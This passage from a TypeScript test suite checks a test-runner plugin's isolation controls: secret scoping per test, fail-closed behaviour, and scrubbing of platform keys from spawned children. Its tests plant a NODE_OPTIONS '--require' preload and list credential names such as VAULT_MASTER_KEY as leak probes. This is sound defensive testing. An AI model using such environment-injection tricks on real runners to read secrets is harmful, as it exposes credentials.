        securityControlModes: { [COMMAND_POLICY_CONTROL_KEYS.specEnv]: 'OBSERVE' },
      }),
      specTest({
        command: NODE,
        args: ['-e', EXPORTED_ENV_JUNIT([])],
        env: { PATH: workspace },
      }),
    );

    // The brake behaved: it stood aside and said it had.
    const note = execution.console.find((entry) => entry.text.includes('environment variable'));
    expect(note?.text).toMatch(/passed anyway because QAAI is in observe mode/);
    // And the floor held anyway.
    expect(execution.errorMessage ?? '').not.toContain('THE PLANTED BINARY RAN');
  });

  it('drops NODE_OPTIONS, so nothing is required before the first line of the test', async () => {
    await writeFile(join(workspace, 'preload.js'), 'require("fs").writeFileSync("PRELOADED", "");\n');

    const execution = await externalPlugin.execute(
      makeContext(workspace),
      specTest({
        command: NODE,
        args: ['-e', EXPORTED_ENV_JUNIT([])],
        env: { NODE_OPTIONS: `--require ${join(workspace, 'preload.js')}` },
      }),
    );

    expect(execution.status).toBe('PASSED');
    expect(existsSync(join(workspace, 'PRELOADED'))).toBe(false);
  });
});

describe('per-test secret scoping, through the plugin', () => {
  const SCOPED = { id: 'sec_stripe', name: 'STRIPE_TEST_KEY', value: 'fake-scoped-value' };
  const UNSCOPED = { id: 'sec_db', name: 'PROD_DB_PASSWORD', value: 'fake-unscoped-value' };

  const spec = {
    command: NODE,
    args: ['-e', EXPORTED_ENV_JUNIT([SCOPED.name, UNSCOPED.name])],
    secretNames: [SCOPED.name, UNSCOPED.name],
  };

  it('injects only the secret a row scopes to this test, under ENFORCE', async () => {
    const execution = await externalPlugin.execute(
      makeContext(workspace, {
        securityControlModes: { SECRET_TEST_SCOPING: 'ENFORCE' },
        scopableSecrets: [SCOPED, UNSCOPED],
        secretScopes: [{ secretId: SCOPED.id, kind: 'TEST', value: 'test_1' }],
      }),
      specTest(spec),
    );

    // The child reports which names it could see, so the assertion is about the
    // CHILD's environment and not about an intermediate object.
    expect(execution.status).toBe('PASSED');
    const sawScoped = execution.steps.some((step) => step.title.includes(`saw:${SCOPED.name}`));
    expect(sawScoped).toBe(true);
    expect(execution.steps.some((step) => step.title.includes(UNSCOPED.name))).toBe(false);
  });

  it('withholds everything when the scopes could not be read, under ENFORCE', async () => {
    // Fail closed. A scope that cannot be determined does not inject.
    const execution = await externalPlugin.execute(
      makeContext(workspace, {
        securityControlModes: { SECRET_TEST_SCOPING: 'ENFORCE' },
        scopableSecrets: [SCOPED, UNSCOPED],
        secretScopes: 'UNAVAILABLE',
      }),
      specTest(spec),
    );

    // The junit suite name prefixes every step title, so the assertion is on
    // the tail: the child saw NO secret at all.
    expect(execution.steps.some((step) => step.title.endsWith('saw:'))).toBe(true);
    expect(execution.console.some((entry) => entry.text.includes('not measured'))).toBe(true);
  });

  it('injects both under the default mode, and counts what it would have withheld', async () => {
    // SECRET_TEST_SCOPING defaults to OBSERVE because no install has a scope row
    // yet, so ENFORCE on day one takes the credentials away from every test.
    const execution = await externalPlugin.execute(
      makeContext(workspace, {
        scopableSecrets: [SCOPED, UNSCOPED],
        secretScopes: [{ secretId: SCOPED.id, kind: 'TEST', value: 'test_1' }],
      }),
      specTest(spec),
    );

    expect(
      execution.steps.some((step) => step.title.includes(`${SCOPED.name}+${UNSCOPED.name}`)),
    ).toBe(true);
    const note = execution.console.find((entry) => entry.text.includes('not in scope'));
    expect(note?.text).toMatch(/1 of 2/);
    expect(note?.text).toMatch(/WERE provided/);
    // Counts only. The name of the secret that was scoped away is a disclosure.
    expect(note?.text).not.toContain(UNSCOPED.name);
  });

  it('reports UNMEASURED rather than a clean zero when the run carries no scopes at all', async () => {
    // Every existing caller is in this state: `RunContext.secrets` is a flat
    // name→value map with no ids, and run.ts does not read `SecretScope` yet.
    // "Nothing was withheld" and "nobody checked" must not read the same.
    const execution = await externalPlugin.execute(
      makeContext(workspace, { secrets: { [SCOPED.name]: SCOPED.value } }),
      specTest({ ...spec, secretNames: [SCOPED.name] }),
    );

    expect(execution.console.some((entry) => entry.text.includes('not measured'))).toBe(true);
    // And NOT as a spelling mistake, which is the other thing it could be.
    expect(execution.console.some((entry) => entry.text.includes('check the spelling'))).toBe(
      false,
    );
  });
});

/**
 * ── THE SCRUBBED EXECUTOR ENVIRONMENT, VERIFIED RATHER THAN ASSUMED ─────────
 *
 * `playwright-harness.ts` records the fix in a comment and `child-env.test.ts`
 * proves it for `childEnv`'s RETURN VALUE. Neither proves it for a process that
 * actually started, and this plugin is the one that spawns a binary a MEMBER
 * named — so this is the end of that chain: real `spawn`, real child, and the
 * child itself reports which platform variables it can read.
 *
 * The other three channels the brief asks about, checked and not assumed:
 *
 *  - A FILE DESCRIPTOR. All nine spawn sites in this package pass a fixed
 *    three-element `stdio` array — `['ignore', 'pipe', 'pipe']`, or `'pipe'` on
 *    stdin only where `cli.ts` has a `spec.stdin` to write. None passes
 *    `'inherit'` and none passes a numeric fd, so the parent's descriptors are
 *    not in the child's table. The assertion below pins that for THIS file.
 *  - A CONFIG FILE THE TEST WRITES. A file in the workspace is read by the
 *    child, which cannot be a leak of the parent's environment: nothing in the
 *    parent writes a platform secret into the workspace, and `writeGeneratedTest`
 *    writes only `test.code`.
 *  - `spec.command`. That is the hole the allowlist above closes, and the
 *    planted-binary tests are its proof.
 */

const PLATFORM_SECRET_NAMES = [
  'VAULT_MASTER_KEY',
  'DATABASE_URL',
  'SESSION_SECRET',
  'S3_SECRET_ACCESS_KEY',
  'REDIS_URL',
] as const;

describe('nothing of the platform reaches a spawned child', () => {
  it('a real child cannot read the worker\'s own keys', async () => {
    const restore: Array<[string, string | undefined]> = [];
    for (const name of PLATFORM_SECRET_NAMES) {
      restore.push([name, process.env[name]]);
      // A value that is unmistakable in a report and is not a credential shape.
      process.env[name] = `platform-value-for-${name}`;
    }

    try {
      const execution = await externalPlugin.execute(
        makeContext(workspace),
        specTest({
          command: NODE,
          args: ['-e', EXPORTED_ENV_JUNIT([...PLATFORM_SECRET_NAMES])],
        }),
      );

      // The child wrote the names it could see into the report, so this is the
      // child's own answer about its own environment.
      expect(execution.status).toBe('PASSED');
      expect(execution.steps.some((step) => step.title.endsWith('saw:'))).toBe(true);
      for (const name of PLATFORM_SECRET_NAMES) {
        expect(JSON.stringify(execution.steps)).not.toContain(name);
      }
    } finally {
      for (const [name, previous] of restore) {
        if (previous === undefined) delete process.env[name];
        else process.env[name] = previous;
      }
    }
  });

  it('hands the child no descriptor of its own', async () => {
    // The same source-level guard `child-env.test.ts` uses for the process.env
    // spread, for the one channel an env allowlist cannot cover.
    const source = await read(new URL('./external.ts', import.meta.url), 'utf8');
    expect(source).toContain("stdio: ['ignore', 'pipe', 'pipe']");
    expect(source).not.toMatch(/stdio:\s*'inherit'/);
    expect(source).not.toMatch(/stdio:.*\binherit\b/);
  });
});
